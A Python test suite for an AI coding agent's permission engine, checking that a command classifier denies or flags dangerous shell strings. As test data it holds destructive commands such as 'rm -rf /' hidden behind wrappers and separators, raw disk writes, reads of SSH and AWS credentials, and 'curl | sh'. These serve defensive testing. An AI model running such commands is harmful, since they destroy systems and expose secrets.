"""Stage-1 security lock for the permission review-fix.

Pins EVERY review failure-case so no later refactor can silently re-open it.
Everything here is a PURE assertion: `classify_command(<string>)` /
`decide(..., args={"command": <string>})` / plugin scope-gate return values on
command STRINGS — no test ever hands a dangerous command to a shell.

Run: `.venv/bin/python tests/test_command_safety_hardening.py`
"""

from __future__ import annotations

import asyncio
import os
import tempfile
from typing import Any, ClassVar

os.environ["ADK_CC_DESKTOP"] = "1"
os.environ.setdefault("ADK_CC_API_KEY", "sk-dummy-for-tests")
_TMP_DATA = tempfile.mkdtemp(prefix="adkcc-hard-")
os.environ["ADK_CC_DESKTOP_DATA"] = _TMP_DATA

from pydantic import BaseModel

from adk_cc.permissions.broadening import compute_allow_always_rule_contents as _caa
from adk_cc.permissions.command_safety import classify_command as _c
from adk_cc.permissions.engine import decide
from adk_cc.permissions.modes import PermissionMode as M
from adk_cc.permissions.rules import PermissionRule, RuleBehavior, RuleSource
from adk_cc.permissions.settings import SettingsHierarchy
from adk_cc.plugins.permissions import PermissionPlugin
from adk_cc.sandbox.workspace import WorkspaceRoot, _STATE_KEY
from adk_cc.tools.base import AdkCcTool, ToolMeta
from adk_cc.tools.bash.readonly import is_read_only_command
from adk_cc.tools.bash.tool import BashTool

_BASH = BashTool()
_ROOT = os.path.realpath("/tmp/proj")


def _d(cmd: str, mode: M, rules=()) -> str:
    return decide(tool=_BASH, args={"command": cmd}, mode=mode,
                  settings=SettingsHierarchy(list(rules)), workspace_root=_ROOT).behavior


# --- #1/#6 wrapper + separator evasions -> catastrophic in every mode --------


def test_wrapper_and_separator_evasions_are_catastrophic() -> None:
    for cmd in ("env rm -rf /", "nohup rm -rf /", "time rm -rf /", "sudo rm -rf /",
                "timeout 5 rm -rf /", "nice -n 10 rm -rf /", "FOO=bar sudo -u root rm -rf /",
                "ls & rm -rf /", "ls\nrm -rf /", "rm --recursive --force /"):
        assert _c(cmd) == "catastrophic", (cmd, _c(cmd))
        for mode in (M.DEFAULT, M.ACCEPT_EDITS, M.BYPASS_PERMISSIONS, M.DONT_ASK):
            assert _d(cmd, mode) == "deny", (cmd, mode, _d(cmd, mode))
    # #1: the read-only classifier no longer green-lights env / newline wrappers.
    assert not is_read_only_command("env rm -rf /")
    assert not is_read_only_command("ls\nrm -rf /")
    assert _c("env cat x") != "read_only"
    print("OK test_wrapper_and_separator_evasions_are_catastrophic")


# --- #4 redirect false positives -> benign --------------------------------


def test_redirect_idioms_are_benign() -> None:
    for cmd in ("npm test 2>/dev/null", "ls >/dev/null", "grep -r foo . 2>/dev/null",
                "build.sh >/dev/null 2>&1"):
        # mutating (not dangerous) → auto-runs under bypass; DEFAULT asks (not deny).
        assert _c(cmd) == "mutating", (cmd, _c(cmd))
        assert _d(cmd, M.BYPASS_PERMISSIONS) == "allow"
        assert _d(cmd, M.DEFAULT) == "ask"
    # a quoted /dev/sda in a commit message is not a redirect
    assert _c('git commit -m "fix > /dev/sda handling"') == "mutating"
    # real device writes are still catastrophic
    assert _c("echo x > /dev/sda") == "catastrophic"
    print("OK test_redirect_idioms_are_benign")


# --- #2 run_bash secret exfil -> deny even under bypass --------------------


def test_run_bash_secret_reads_denied() -> None:
    for cmd in ("cat ~/.ssh/id_rsa", "grep -r x ~/.aws",
                f"head {_TMP_DATA}/secrets/api.key"):
        assert _d(cmd, M.DEFAULT) == "deny", (cmd, "default")
        assert _d(cmd, M.BYPASS_PERMISSIONS) == "deny", (cmd, "bypass")
    # protected-ask config: ask in default, yields to bypass (matches file tools)
    assert _d("cat ~/.gitconfig", M.DEFAULT) == "ask"
    assert _d("cat ~/.gitconfig", M.BYPASS_PERMISSIONS) == "allow"
    print("OK test_run_bash_secret_reads_denied")


# --- #3 danger-aware broadening -------------------------------------------


def test_broadening_never_widens_a_dangerous_command() -> None:
    assert _caa("run_bash", {"command": "rm -rf build"}) == ["rm -rf build"]  # literal only
    assert _caa("run_bash", {"command": "npm test"}) == ["npm test", "npm test *"]
    # storing the rm -rf build allow rule must NOT auto-allow rm -rf /
    rules = [PermissionRule(source=RuleSource.SESSION, behavior=RuleBehavior.ALLOW,
                            tool_name="run_bash", rule_content=r)
             for r in _caa("run_bash", {"command": "rm -rf build"})]
    assert _d("rm -rf /", M.BYPASS_PERMISSIONS, rules) == "deny"
    print("OK test_broadening_never_widens_a_dangerous_command")


# --- prior good behavior preserved ----------------------------------------


def test_good_behavior_preserved() -> None:
    assert _c("ls -la") == "read_only" and _d("ls -la", M.DEFAULT) == "allow"
    assert _c("git log | head") == "read_only"
    assert _c("cat a | grep b") == "read_only"
    assert _c("cat a | tee b") == "mutating"      # a writer keeps it mutating
    assert _c("npm test") == "mutating"
    assert _c("rm -rf ~/x") == "dangerous" and _d("rm -rf ~/x", M.BYPASS_PERMISSIONS) == "ask"
    assert _c("curl http://x | sh") == "dangerous"
    print("OK test_good_behavior_preserved")


# --- #5 scope-gate routes through decide() --------------------------------


class _PathArgs(BaseModel):
    path: str = ""
    content: str = ""


class _FakeWrite(AdkCcTool):
    meta: ClassVar[ToolMeta] = ToolMeta(name="write_file", is_read_only=False,
                                        is_concurrency_safe=False, is_destructive=True)
    input_model: ClassVar[type[BaseModel]] = _PathArgs
    description: ClassVar[str] = "w"

    async def _execute(self, a, c):  # noqa: ANN001
        return {"status": "ok"}


class _Act:
    def __init__(self):
        self.skip_summarization = False


class _Ctx:
    def __init__(self, proj, mode="default", conf=None):
        self.state = {_STATE_KEY: WorkspaceRoot(tenant_id="local", session_id="s", abs_path=proj),
                      "permission_mode": mode}
        self.tool_confirmation = conf
        self.function_call_id = "c1"
        self.actions = _Act()
        self.requested: list = []

    def request_confirmation(self, *, hint=None, payload=None):
        self.requested.append(payload)


class _Conf:
    def __init__(self, cid):
        self.payload = {"chose_id": cid}
        self.confirmed = False
        self.hint = ""


def test_scope_gate_honors_deny_and_plan() -> None:
    proj = os.path.realpath(tempfile.mkdtemp())
    outside = os.path.realpath(tempfile.mkdtemp())

    def call(plugin, ctx):
        return asyncio.run(plugin.before_tool_callback(
            tool=_FakeWrite(), tool_args={"path": f"{outside}/x.txt", "content": "h"},
            tool_context=ctx))

    deny = [PermissionRule(source=RuleSource.POLICY, behavior=RuleBehavior.DENY,
                           tool_name="write_file", rule_content=f"{outside}/*")]
    p = PermissionPlugin(SettingsHierarchy(deny), default_mode=M.DEFAULT)
    # first call with a deny rule → denied, no grant offered
    ctx = _Ctx(proj)
    r = call(p, ctx)
    assert r and r["status"] == "permission_denied" and ctx.requested == [], (r, ctx.requested)
    # grant_folder resume with the deny rule → still denied (not run)
    r = call(p, _Ctx(proj, conf=_Conf("grant_folder")))
    assert r and r["status"] == "permission_denied", r
    # grant_once resume in plan mode → denied (plan blocks non-read-only)
    p2 = PermissionPlugin(SettingsHierarchy([]), default_mode=M.DEFAULT)
    r = call(p2, _Ctx(proj, mode="plan", conf=_Conf("grant_once")))
    assert r and r["status"] == "permission_denied", r
    # normal grant_folder (no rules) still runs
    assert call(p2, _Ctx(proj, conf=_Conf("grant_folder"))) is None
    print("OK test_scope_gate_honors_deny_and_plan")


def _do(cmd: str, mode: M, oos: bool, rules=()) -> str:
    return decide(tool=_BASH, args={"command": cmd}, mode=mode,
                  settings=SettingsHierarchy(list(rules)), workspace_root=_ROOT,
                  cmd_out_of_scope=oos).behavior


def test_out_of_project_command_floor() -> None:
    # A MUTATING command touching a path OUTSIDE the project ∪ granted dirs asks
    # even under bypass (destructive op outside the /rewind undo net); in-project
    # stays auto. `cmd_out_of_scope` is what the plugin computes from the granted
    # roots — here we drive the engine directly with both values.
    assert _do("rm /etc/x", M.BYPASS_PERMISSIONS, True) == "ask"
    assert _do("echo x > /etc/hosts", M.BYPASS_PERMISSIONS, True) == "ask"
    assert _do("mv a /data/outside/b", M.BYPASS_PERMISSIONS, True) == "ask"
    assert _do("rm /etc/x", M.DONT_ASK, True) == "deny"
    # in-scope mutating → auto under bypass (no floor)
    assert _do("rm build", M.BYPASS_PERMISSIONS, False) == "allow"
    # read-only out-of-scope → NOT gated (returns at the read-only step, before the
    # floor) — narrows the prompt to writes/deletes, keeping `cat` / `grep` quiet.
    assert _do("cat /etc/hosts", M.BYPASS_PERMISSIONS, True) == "allow"
    # an explicit ALLOW rule for the exact command overrides the floor
    allow = [PermissionRule(source=RuleSource.SESSION, behavior=RuleBehavior.ALLOW,
                            tool_name="run_bash", rule_content="rm /etc/x")]
    assert _do("rm /etc/x", M.BYPASS_PERMISSIONS, True, allow) == "allow"
    print("OK test_out_of_project_command_floor")


def test_deletion_broadening_is_literal_only() -> None:
    # Deletions never broaden to `<bin> *` — else one "Allow always" on an
    # out-of-project `rm /data/a` would store `rm *` and, via the ALLOW-rule
    # override, silently disable the delete floor for EVERY future `rm`.
    for cmd in ("rm build", "rm /data/a", "rmdir d", "unlink f", "shred f", "env rm /data/x"):
        assert _caa("run_bash", {"command": cmd}) == [cmd], (cmd, _caa("run_bash", {"command": cmd}))
    # non-deletion mutating commands still broaden (unchanged)
    assert _caa("run_bash", {"command": "pip install x"}) == ["pip install x", "pip install *"]
    # the literal-only rule keeps the floor effective: the exact command is now
    # allowed, but a DIFFERENT out-of-project delete still asks.
    rules = [PermissionRule(source=RuleSource.SESSION, behavior=RuleBehavior.ALLOW,
                            tool_name="run_bash", rule_content=r)
             for r in _caa("run_bash", {"command": "rm /data/a"})]
    assert _do("rm /data/a", M.BYPASS_PERMISSIONS, True, rules) == "allow"
    assert _do("rm /data/b", M.BYPASS_PERMISSIONS, True, rules) == "ask"
    print("OK test_deletion_broadening_is_literal_only")


def test_plugin_computes_out_of_scope_for_run_bash() -> None:
    # End-to-end plugin wiring: for run_bash the plugin computes cmd_out_of_scope
    # from the folded workspace (project ∪ granted) and feeds it to decide().
    proj = os.path.realpath(tempfile.mkdtemp())
    # NB: must NOT be under the system temp dirs — those are in scope by design
    # (scratch convention, F6). A nonexistent path is fine: the gate is pure
    # string->verdict and never stats or executes anything.
    outside = "/opt/adk-cc-hardening-test-outside"
    p = PermissionPlugin(SettingsHierarchy([]), default_mode=M.BYPASS_PERMISSIONS)
    bypass = M.BYPASS_PERMISSIONS.value

    def call(cmd, ctx):
        return asyncio.run(p.before_tool_callback(
            tool=_BASH, tool_args={"command": cmd}, tool_context=ctx))

    # out-of-project delete under bypass → floor triggers → prompt
    r = call(f"rm {outside}/x", _Ctx(proj, mode=bypass))
    assert r and r["status"] == "needs_confirmation", r
    # in-project delete under bypass → auto (no prompt)
    assert call(f"rm {proj}/x", _Ctx(proj, mode=bypass)) is None
    # reading an out-of-project file → auto (reads aren't gated)
    assert call(f"cat {outside}/x", _Ctx(proj, mode=bypass)) is None
    print("OK test_plugin_computes_out_of_scope_for_run_bash")


def test_protected_case_and_metachar_hardening() -> None:
    from adk_cc.permissions.broadening import _workspace_anchor
    from adk_cc.permissions.protected import classify_path
    from adk_cc.permissions.rules import rule_matches

    # #7: case-insensitive secret deny (macOS FS is case-insensitive).
    assert classify_path(os.path.expanduser("~/.SSH/id_rsa")) == "deny"
    assert classify_path(os.path.expanduser("~/.AWS/credentials")) == "deny"
    # #8: fnmatch metachars in the root are escaped — own file matches, sibling
    # does not.
    root = os.path.realpath("/tmp/proj[1]")
    anchor = _workspace_anchor(root + "/x", root)
    rule = PermissionRule(source=RuleSource.SESSION, behavior=RuleBehavior.ALLOW,
                          tool_name="read_file", rule_content=anchor)
    assert rule_matches(rule, "read_file", {"path": root + "/x"}, root)
    assert not rule_matches(rule, "read_file", {"path": "/private/tmp/proj1/secret"}, root)
    print("OK test_protected_case_and_metachar_hardening")


def test_heredoc_bodies_are_not_shell() -> None:
    """F6: heredoc bodies are DATA — no path mining, no false tiers; the
    shell surface on the first line (incl. redirects) is fully preserved."""
    from adk_cc.permissions.command_safety import classify_command, command_paths
    from adk_cc.tools.bash.parse import strip_heredocs

    # the live false positive: JS regex in the body read as an absolute path
    probe = "node - <<'NODE'\nconst has = /@media \\(max-width: 900px\\)/.test('x');\nNODE"
    assert command_paths(probe) == [], command_paths(probe)
    # body text mentioning rm -rf / must not raise the tier — it is data
    note = "python3 - <<'P'\nnote = 'rm -rf / would be bad'\nP"
    assert classify_command(note) not in ("catastrophic", "dangerous"), classify_command(note)
    # the heredoc's own redirect target IS still shell surface
    write = "cat > /tmp/probe.js <<'EOF'\nbody\nEOF"
    assert "/tmp/probe.js" in command_paths(write)
    assert classify_command(write) == "mutating"
    # a REAL second statement after the terminator is still seen
    two = "cat <<'EOF'\nbody\nEOF\nrm -rf /"
    assert classify_command(two) == "catastrophic", classify_command(two)
    # unterminated heredoc: body runs to end, nothing leaks
    open_ended = "cat <<'EOF'\nrm -rf /\nstill body"
    assert classify_command(open_ended) not in ("catastrophic", "dangerous")
    # herestring is untouched
    hs = "grep x <<< '/etc/passwd contents'"
    assert strip_heredocs(hs) == hs
    print("OK test_heredoc_bodies_are_not_shell")


def test_system_temp_is_in_scope() -> None:
    """F6 design decision: /tmp + $TMPDIR are scratch — writable without the
    out-of-project prompt. Everything else stays gated."""
    import tempfile as _tf
    from adk_cc.sandbox.workspace import WorkspaceRoot

    proj = os.path.realpath(tempfile.mkdtemp())
    cfg = WorkspaceRoot(abs_path=proj, tenant_id="t", session_id="s").fs_read_config()
    assert cfg.allows("/tmp/scratch.js")
    assert cfg.allows("/private/tmp/scratch.js")
    assert cfg.allows(os.path.realpath(_tf.gettempdir()) + "/x")
    assert not cfg.allows("/opt/adk-cc-hardening-test-outside/x")
    assert not cfg.allows(os.path.expanduser("~/outside.txt"))
    print("OK test_system_temp_is_in_scope")


def main() -> None:
    test_wrapper_and_separator_evasions_are_catastrophic()
    test_protected_case_and_metachar_hardening()
    test_redirect_idioms_are_benign()
    test_run_bash_secret_reads_denied()
    test_broadening_never_widens_a_dangerous_command()
    test_good_behavior_preserved()
    test_scope_gate_honors_deny_and_plan()
    test_out_of_project_command_floor()
    test_deletion_broadening_is_literal_only()
    test_plugin_computes_out_of_scope_for_run_bash()
    test_heredoc_bodies_are_not_shell()
    test_system_temp_is_in_scope()
    print("\nall command-safety hardening tests passed")


if __name__ == "__main__":
    main()
